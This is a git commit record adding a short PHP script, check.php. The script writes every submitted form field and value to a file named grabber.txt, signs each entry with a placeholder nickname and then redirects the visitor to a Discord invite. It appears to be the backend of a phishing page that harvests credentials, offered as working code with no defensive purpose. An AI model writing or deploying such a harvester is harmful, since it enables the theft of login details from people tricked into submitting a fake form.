3e29cc76fbc8dcbb2db8f877995b80890fc335a9
danalphat <159629628+danalphat@users.noreply.github.com>
2024-02-11 11:44:06 +0100

    Add files via upload

---
+++ check.php
@@ -0,0 +1,16 @@
+<?php
+header ('Location:https://discord.com/invite/alphatech');
+$handle = fopen('grabber.txt', 'a');
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, '=');
+fwrite($handle, $value);
+fwrite($handle, '|');
+}
+fwrite($handle, "by TON PSEUDO");
+fwrite($handle,'|');
+fwrite($handle,"\n");
+fclose($handle);
+exit;
+?>
+C
